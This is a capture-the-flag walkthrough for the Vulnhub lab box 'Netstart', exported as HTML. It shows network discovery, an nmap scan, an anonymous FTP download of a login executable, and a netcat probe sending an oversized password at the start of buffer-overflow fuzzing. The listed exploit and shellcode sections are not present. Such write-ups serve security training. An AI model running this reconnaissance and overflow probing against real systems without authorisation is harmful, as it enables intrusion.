<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Netstart</title><style>
/* cspell:disable-file */
/* webkit printing magic: print all background colors */
html {
	-webkit-print-color-adjust: exact;
}
* {
	box-sizing: border-box;
	-webkit-print-color-adjust: exact;
}

html,
body {
	margin: 0;
	padding: 0;
}
@media only screen {
	body {
		margin: 2em auto;
		max-width: 900px;
		color: rgb(55, 53, 47);
	}
}

body {
	line-height: 1.5;
	white-space: pre-wrap;
}

a,
a.visited {
	color: inherit;
	text-decoration: underline;
}

.pdf-relative-link-path {
	font-size: 80%;
	color: #444;
}

h1,
h2,
h3 {
	letter-spacing: -0.01em;
	line-height: 1.2;
	font-weight: 600;
	margin-bottom: 0;
}

.page-title {
	font-size: 2.5rem;
	font-weight: 700;
	margin-top: 0;
	margin-bottom: 0.75em;
}

h1 {
	font-size: 1.875rem;
	margin-top: 1.875rem;
}

h2 {
	font-size: 1.5rem;
	margin-top: 1.5rem;
}

h3 {
	font-size: 1.25rem;
	margin-top: 1.25rem;
}

.source {
	border: 1px solid #ddd;
	border-radius: 3px;
	padding: 1.5em;
	word-break: break-all;
}

.callout {
	border-radius: 3px;
	padding: 1rem;
}

figure {
	margin: 1.25em 0;
	page-break-inside: avoid;
}

figcaption {
	opacity: 0.5;
	font-size: 85%;
	margin-top: 0.5em;
}

mark {
	background-color: transparent;
}

.indented {
	padding-left: 1.5em;
}

hr {
	background: transparent;
	display: block;
	width: 100%;
	height: 1px;
	visibility: visible;
	border: none;
	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
}

img {
	max-width: 100%;
}

@media only print {
	img {
		max-height: 100vh;
		object-fit: contain;
	}
}

@page {
	margin: 1in;
}

.collection-content {
	font-size: 0.875rem;
}

.column-list {
	display: flex;
	justify-content: space-between;
}

.column {
	padding: 0 1em;
}

.column:first-child {
	padding-left: 0;
}

.column:last-child {
	padding-right: 0;
}

.table_of_contents-item {
	display: block;
	font-size: 0.875rem;
	line-height: 1.3;
	padding: 0.125rem;
}

.table_of_contents-indent-1 {
	margin-left: 1.5rem;
}

.table_of_contents-indent-2 {
	margin-left: 3rem;
}

.table_of_contents-indent-3 {
	margin-left: 4.5rem;
}

.table_of_contents-link {
	text-decoration: none;
	opacity: 0.7;
	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
}

table,
th,
td {
	border: 1px solid rgba(55, 53, 47, 0.09);
	border-collapse: collapse;
}

table {
	border-left: none;
	border-right: none;
}

th,
td {
	font-weight: normal;
	padding: 0.25em 0.5em;
	line-height: 1.5;
	min-height: 1.5em;
	text-align: left;
}

th {
	color: rgba(55, 53, 47, 0.6);
}

ol,
ul {
	margin: 0;
	margin-block-start: 0.6em;
	margin-block-end: 0.6em;
}

li > ol:first-child,
li > ul:first-child {
	margin-block-start: 0.6em;
}

ul > li {
	list-style: disc;
}

ul.to-do-list {
	text-indent: -1.7em;
}

ul.to-do-list > li {
	list-style: none;
}

.to-do-children-checked {
	text-decoration: line-through;
	opacity: 0.375;
}

ul.toggle > li {
	list-style: none;
}

ul {
	padding-inline-start: 1.7em;
}

ul > li {
	padding-left: 0.1em;
}

ol {
	padding-inline-start: 1.6em;
}

ol > li {
	padding-left: 0.2em;
}

.mono ol {
	padding-inline-start: 2em;
}

.mono ol > li {
	text-indent: -0.4em;
}

.toggle {
	padding-inline-start: 0em;
	list-style-type: none;
}

/* Indent toggle children */
.toggle > li > details {
	padding-left: 1.7em;
}

.toggle > li > details > summary {
	margin-left: -1.1em;
}

.selected-value {
	display: inline-block;
	padding: 0 0.5em;
	background: rgba(206, 205, 202, 0.5);
	border-radius: 3px;
	margin-right: 0.5em;
	margin-top: 0.3em;
	margin-bottom: 0.3em;
	white-space: nowrap;
}

.collection-title {
	display: inline-block;
	margin-right: 1em;
}

.simple-table {
	margin-top: 1em;
	font-size: 0.875rem;
	empty-cells: show;
}
.simple-table td {
	height: 29px;
	min-width: 120px;
}

.simple-table th {
	height: 29px;
	min-width: 120px;
}

.simple-table-header-color {
	background: rgb(247, 246, 243);
	color: black;
}
.simple-table-header {
	font-weight: 500;
}

time {
	opacity: 0.5;
}

.icon {
	display: inline-block;
	max-width: 1.2em;
	max-height: 1.2em;
	text-decoration: none;
	vertical-align: text-bottom;
	margin-right: 0.5em;
}

img.icon {
	border-radius: 3px;
}

.user-icon {
	width: 1.5em;
	height: 1.5em;
	border-radius: 100%;
	margin-right: 0.5rem;
}

.user-icon-inner {
	font-size: 0.8em;
}

.text-icon {
	border: 1px solid #000;
	text-align: center;
}

.page-cover-image {
	display: block;
	object-fit: cover;
	width: 100%;
	max-height: 30vh;
}

.page-header-icon {
	font-size: 3rem;
	margin-bottom: 1rem;
}

.page-header-icon-with-cover {
	margin-top: -0.72em;
	margin-left: 0.07em;
}

.page-header-icon img {
	border-radius: 3px;
}

.link-to-page {
	margin: 1em 0;
	padding: 0;
	border: none;
	font-weight: 500;
}

p > .user {
	opacity: 0.5;
}

td > .user,
td > time {
	white-space: nowrap;
}

input[type="checkbox"] {
	transform: scale(1.5);
	margin-right: 0.6em;
	vertical-align: middle;
}

p {
	margin-top: 0.5em;
	margin-bottom: 0.5em;
}

.image {
	border: none;
	margin: 1.5em 0;
	padding: 0;
	border-radius: 0;
	text-align: center;
}

.code,
code {
	background: rgba(135, 131, 120, 0.15);
	border-radius: 3px;
	padding: 0.2em 0.4em;
	border-radius: 3px;
	font-size: 85%;
	tab-size: 2;
}

code {
	color: #eb5757;
}

.code {
	padding: 1.5em 1em;
}

.code-wrap {
	white-space: pre-wrap;
	word-break: break-all;
}

.code > code {
	background: none;
	padding: 0;
	font-size: 100%;
	color: inherit;
}

blockquote {
	font-size: 1.25em;
	margin: 1em 0;
	padding-left: 1em;
	border-left: 3px solid rgb(55, 53, 47);
}

.bookmark {
	text-decoration: none;
	max-height: 8em;
	padding: 0;
	display: flex;
	width: 100%;
	align-items: stretch;
}

.bookmark-title {
	font-size: 0.85em;
	overflow: hidden;
	text-overflow: ellipsis;
	height: 1.75em;
	white-space: nowrap;
}

.bookmark-text {
	display: flex;
	flex-direction: column;
}

.bookmark-info {
	flex: 4 1 180px;
	padding: 12px 14px 14px;
	display: flex;
	flex-direction: column;
	justify-content: space-between;
}

.bookmark-image {
	width: 33%;
	flex: 1 1 180px;
	display: block;
	position: relative;
	object-fit: cover;
	border-radius: 1px;
}

.bookmark-description {
	color: rgba(55, 53, 47, 0.6);
	font-size: 0.75em;
	overflow: hidden;
	max-height: 4.5em;
	word-break: break-word;
}

.bookmark-href {
	font-size: 0.75em;
	margin-top: 0.25em;
}

.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.highlight-default {
	color: rgba(55, 53, 47, 1);
}
.highlight-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.highlight-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.highlight-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.highlight-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.highlight-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.highlight-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.highlight-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.highlight-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.highlight-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.highlight-gray_background {
	background: rgba(241, 241, 239, 1);
}
.highlight-brown_background {
	background: rgba(244, 238, 238, 1);
}
.highlight-orange_background {
	background: rgba(251, 236, 221, 1);
}
.highlight-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.highlight-teal_background {
	background: rgba(237, 243, 236, 1);
}
.highlight-blue_background {
	background: rgba(231, 243, 248, 1);
}
.highlight-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.highlight-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.highlight-red_background {
	background: rgba(253, 235, 236, 1);
}
.block-color-default {
	color: inherit;
	fill: inherit;
}
.block-color-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.block-color-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.block-color-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.block-color-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.block-color-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.block-color-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.block-color-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.block-color-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.block-color-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.block-color-gray_background {
	background: rgba(241, 241, 239, 1);
}
.block-color-brown_background {
	background: rgba(244, 238, 238, 1);
}
.block-color-orange_background {
	background: rgba(251, 236, 221, 1);
}
.block-color-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.block-color-teal_background {
	background: rgba(237, 243, 236, 1);
}
.block-color-blue_background {
	background: rgba(231, 243, 248, 1);
}
.block-color-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.block-color-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.block-color-red_background {
	background: rgba(253, 235, 236, 1);
}
.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
.select-value-color-opaquegray { background-color: rgba(255, 255, 255, 0.0375); }
.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }

.checkbox {
	display: inline-flex;
	vertical-align: text-bottom;
	width: 16;
	height: 16;
	background-size: 16px;
	margin-left: 2px;
	margin-right: 5px;
}

.checkbox-on {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
}

.checkbox-off {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
}
	
</style></head><body><article id="5343667b-3517-4bed-80bc-b09d698b4d38" class="page sans"><header><h1 class="page-title">Netstart</h1></header><div class="page-body"><p id="8c74bcb4-92e2-4aad-ba37-9be008bf8d82" class="">
<strong>Table of Contents</strong></p><nav id="2cab40dc-45df-422a-af42-4a31edfab606" class="block-color-blue_background table_of_contents"><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#61d88c77-bb38-4ee8-92ca-888390525501"><mark class="highlight-blue">Quick Summary</mark></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#b4ddc933-5d30-40d5-ab4e-9db45e0bd30e"><mark class="highlight-blue">IP addresses</mark></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#57fb9948-3a95-4fe7-8627-dc93d81a614a"><mark class="highlight-blue">nmap Scan</mark></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#a158a86b-637b-46c8-bd43-d904459aaed8">
<mark class="highlight-blue">Enumeration</mark></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#9b72482a-3ff5-4418-9996-372ca0cf0016"><mark class="highlight-blue">How does the exe work:</mark></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#1a391a9c-a928-4134-b873-d91aec4816d9"><mark class="highlight-blue">Fuzzing</mark></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#785d2687-7dcd-4f17-8ebd-714f5209a1f9"><mark class="highlight-blue">Finding the EIP Offset:</mark></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#ec7ab677-c52d-4f1f-a132-853cf84b6c3d"><mark class="highlight-blue">Replacing the EIP</mark></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#bf1c4911-266e-4335-8767-3922b3404cf7"><mark class="highlight-blue">Finding the bad characters</mark></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#ec9c42ec-06bb-4059-bddf-1ba007380164"><mark class="highlight-blue">Finding the right modules</mark></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#db32572f-5327-45fd-a497-a84f4b2693ef"><mark class="highlight-blue">Generating the Shell code</mark></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#9379c616-8027-4e99-b1c9-7acc133de31d">
<mark class="highlight-blue">Privilege Escalation</mark></a></div></nav><p id="ac8955eb-b9f0-4069-a3b5-e3db8887bc30" class="">
</p><h2 id="61d88c77-bb38-4ee8-92ca-888390525501" class=""><mark class="highlight-blue">Quick Summary</mark></h2><table id="3ed73cec-4932-4766-82e6-7e4ff7743394" class="simple-table"><tbody><tr id="fddf50c7-9073-4dd8-9f64-5e372254b931"><th id="vMFW" class="simple-table-header-color simple-table-header">Name of the box</th><td id="bV=C" class="">Netstart</td></tr><tr id="8ea92624-6970-4251-842d-a3be58625d2d"><th id="vMFW" class="simple-table-header-color simple-table-header">Platform</th><td id="bV=C" class="">Vulnhub</td></tr><tr id="09b458e3-731b-4354-a04f-07cf9bc8765d"><th id="vMFW" class="simple-table-header-color simple-table-header">Description</th><td id="bV=C" class="">Buffer Overflow</td></tr><tr id="9663ba6b-f08a-4a2b-a756-ddf467850ed4"><th id="vMFW" class="simple-table-header-color simple-table-header">Difficulty</th><td id="bV=C" class="">Easy</td></tr></tbody></table><p id="f7ded2cd-44be-40fa-a9b5-5bdc0ad46901" class="">
</p><p id="e3317e0c-a64b-4301-b33a-634a9512e3bc" class="">We downloaded the iso from vulnhub and powered on the machine using Oracle Virtual Box.</p><h2 id="b4ddc933-5d30-40d5-ab4e-9db45e0bd30e" class=""><mark class="highlight-blue">IP addresses</mark></h2><p id="4246f5cc-7670-4566-92a5-5864d50992a1" class="">
</p><pre id="cb0912e2-7d7b-403b-839f-7db93d5a04c7" class="code"><code>‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/vulnhub/earth]
‚îî‚îÄ# netdiscover -r 192.168.57.0/24

Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                                                                                              
                                                                                                                                                                                                                                            
 5 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 300                                                                                                                                                                            
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.57.1    52:54:00:12:35:00      1      60  Unknown vendor                                                                                                                                                                           
 192.168.57.2    52:54:00:12:35:00      1      60  Unknown vendor                                                                                                                                                                           
 192.168.57.3    08:00:27:11:18:91      2     120  PCS Systemtechnik GmbH                                                                                                                                                                   
 192.168.57.13   08:00:27:2a:1f:44      1      60  PCS Systemtechnik GmbH

‚îå‚îÄ‚îÄ(rootüíÄkali)-[~]
‚îî‚îÄ# ifconfig                                                                                                                                                                                                                           130 ‚®Ø
eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
        inet 192.168.57.4  netmask 255.255.255.0  broadcast 192.168.57.255
        inet6 fe80::a00:27ff:fe0e:348d  prefixlen 64  scopeid 0x20&lt;link&gt;
        ether 08:00:27:0e:34:8d  txqueuelen 1000  (Ethernet)
        RX packets 344  bytes 152284 (148.7 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 650  bytes 57491 (56.1 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 8  bytes 400 (400.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 8  bytes 400 (400.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</code></pre><p id="f9f47a65-b4d0-4e40-aa74-ada43e01f986" class="">
</p><p id="6468aaef-632f-4bd8-8c0e-64f88d855338" class="">IP address of the Kali machine - 192.168.57.4</p><p id="d5150fb4-baeb-4825-8a75-b55ada2e0488" class="">IP address of the target - 192.168.57.13</p><h2 id="57fb9948-3a95-4fe7-8627-dc93d81a614a" class=""><mark class="highlight-blue">nmap Scan</mark></h2><p id="ee54d2ce-56a8-4aa3-b0e9-6788967e96a2" class="">We will now run nmap scan on the target machine.</p><p id="5249ecf4-d2c9-4445-958e-8d02c0eb628b" class="">
</p><pre id="6f476d21-e3ba-4544-a87e-3954fe606cc1" class="code"><code>‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/vulnhub/netstart]
‚îî‚îÄ# nmap -T4 -p- -A 192.168.57.13
Starting Nmap 7.91 ( https://nmap.org ) at 2023-02-23 03:47 EST
Nmap scan report for 192.168.57.13
Host is up (0.00048s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0           50992 Nov 16  2020 login.exe
|_-rw-r--r--    1 0        0           28613 Nov 16  2020 login_support.dll
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.57.4
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
2371/tcp open  worldwire?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|_    Password:
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port2371-TCP:V=7.91%I=7%D=2/23%Time=63F72810%P=x86_64-pc-linux-gnu%r(NU
SF:LL,B,&quot;Password:\n\0&quot;)%r(GenericLines,B,&quot;Password:\n\0&quot;)%r(GetRequest,B,
SF:&quot;Password:\n\0&quot;)%r(HTTPOptions,B,&quot;Password:\n\0&quot;)%r(RTSPRequest,B,&quot;Pass
SF:word:\n\0&quot;)%r(RPCCheck,B,&quot;Password:\n\0&quot;)%r(DNSVersionBindReqTCP,B,&quot;Pas
SF:sword:\n\0&quot;)%r(DNSStatusRequestTCP,B,&quot;Password:\n\0&quot;)%r(Help,B,&quot;Passwor
SF:d:\n\0&quot;)%r(SSLSessionReq,B,&quot;Password:\n\0&quot;)%r(TerminalServerCookie,B,&quot;P
SF:assword:\n\0&quot;)%r(TLSSessionReq,B,&quot;Password:\n\0&quot;)%r(Kerberos,B,&quot;Passwor
SF:d:\n\0&quot;)%r(SMBProgNeg,B,&quot;Password:\n\0&quot;)%r(X11Probe,B,&quot;Password:\n\0&quot;)%
SF:r(FourOhFourRequest,B,&quot;Password:\n\0&quot;)%r(LPDString,B,&quot;Password:\n\0&quot;)%r
SF:(LDAPSearchReq,B,&quot;Password:\n\0&quot;)%r(LDAPBindReq,B,&quot;Password:\n\0&quot;)%r(SI
SF:POptions,B,&quot;Password:\n\0&quot;)%r(LANDesk-RC,B,&quot;Password:\n\0&quot;)%r(TerminalS
SF:erver,B,&quot;Password:\n\0&quot;)%r(NCP,B,&quot;Password:\n\0&quot;)%r(NotesRPC,B,&quot;Passwor
SF:d:\n\0&quot;)%r(JavaRMI,B,&quot;Password:\n\0&quot;)%r(WMSRequest,B,&quot;Password:\n\0&quot;)%r
SF:(oracle-tns,B,&quot;Password:\n\0&quot;)%r(ms-sql-s,B,&quot;Password:\n\0&quot;)%r(afp,B,&quot;P
SF:assword:\n\0&quot;)%r(giop,B,&quot;Password:\n\0&quot;);
MAC Address: 08:00:27:BE:31:0E (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
Network Distance: 1 hop
Service Info: OS: Unix</code></pre><h2 id="a158a86b-637b-46c8-bd43-d904459aaed8" class="">
<mark class="highlight-blue">Enumeration</mark></h2><p id="9c4447a3-bc7a-42bf-a0ed-662ee7fc42c5" class="">
</p><p id="4507d517-7d7e-49d6-a5d2-ef3a0d8f13a7" class="">FTP anonymous login is allowed. We will see if we get any information from the FTP server.</p><p id="88f09338-013e-4c24-bccd-7b89fec32991" class="">
</p><pre id="f02b6565-a90b-4aca-bea9-50d83eec1c10" class="code"><code>‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/vulnhub/netstart]
‚îî‚îÄ# ftp 192.168.57.13
Connected to 192.168.57.13.
220 (vsFTPd 3.0.3)
Name (192.168.57.13:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0           50992 Nov 16  2020 login.exe
-rw-r--r--    1 0        0           28613 Nov 16  2020 login_support.dll
226 Directory send OK.
ftp&gt; binary
200 Switching to Binary mode.
ftp&gt; get login.exe
local: login.exe remote: login.exe
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for login.exe (50992 bytes).
226 Transfer complete.
50992 bytes received in 0.00 secs (147.8108 MB/s)
ftp&gt; get login_support.dll
local: login_support.dll remote: login_support.dll
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for login_support.dll (28613 bytes).
226 Transfer complete.
28613 bytes received in 0.00 secs (183.1375 MB/s)
ftp&gt; bye
221 Goodbye.
                                                                                                                                                                                                                                             
‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/vulnhub/netstart]
‚îî‚îÄ# ls
login.exe  login_support.dll</code></pre><p id="a8cda388-3ab3-4501-8810-890baa179bb5" class="">
We will now copy the exe to a Windows 7 machine where we installed Immunity debugger.</p><h2 id="9b72482a-3ff5-4418-9996-372ca0cf0016" class=""><mark class="highlight-blue">How does the exe work:</mark></h2><p id="6b36a0e9-3b74-4e26-8b18-676b95c12c54" class="">
</p><figure id="51f6a454-b5eb-40ab-b897-271fcef908f7" class="image"><a href="Netstart%205343667b35174bed80bcb09d698b4d38/Untitled.png"><img style="width:676px" src="../../images/vulnhub/netstart/Untitled.png"/></a></figure><p id="d8289d02-236f-46f2-b80f-3b58f72860a4" class="">
The exe is listening on port 2372 for connections.</p><p id="5c844be5-d6e7-4a06-87fb-2117bdaf31da" class="">
</p><pre id="0b464ed3-9d2c-40cf-b0b0-548164eeb313" class="code"><code>‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/vulnhub/netstart]
‚îî‚îÄ# nc -nv 192.168.57.11 2371
(UNKNOWN) [192.168.57.11] 2371 (?) open
Password:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</code></pre><p id="3eb20eab-202a-4547-a56b-e13e5e0a17df" class="">
</p><h2 id="1a391a9c-a928-4134-b873-d91aec4816d9" class=""><mark class="highlight-blue">Fuzzing</mark></h2><p id="a242b0ad-47ec-4fe6-87f7-2632130d2f18" class="">
</p><p id="cfc0e7e1-2d51-4a53-b0f8-db41ee9fcf61" class="">Now we will fuzz the application and see if we can crash the application.</p><p id="448722ef-cd7e-4225-93ed-b27817313ad4" class="">
</p><pre id="42a662d0-dcaa-4981-b75b-bf89c1502a6d" class="code"><code>‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/vulnhub/netstart]
‚îî‚îÄ# nc -nv 192.168.57.11 2371
(UNKNOWN) [192.168.57.11] 2371 (?) open
Password:
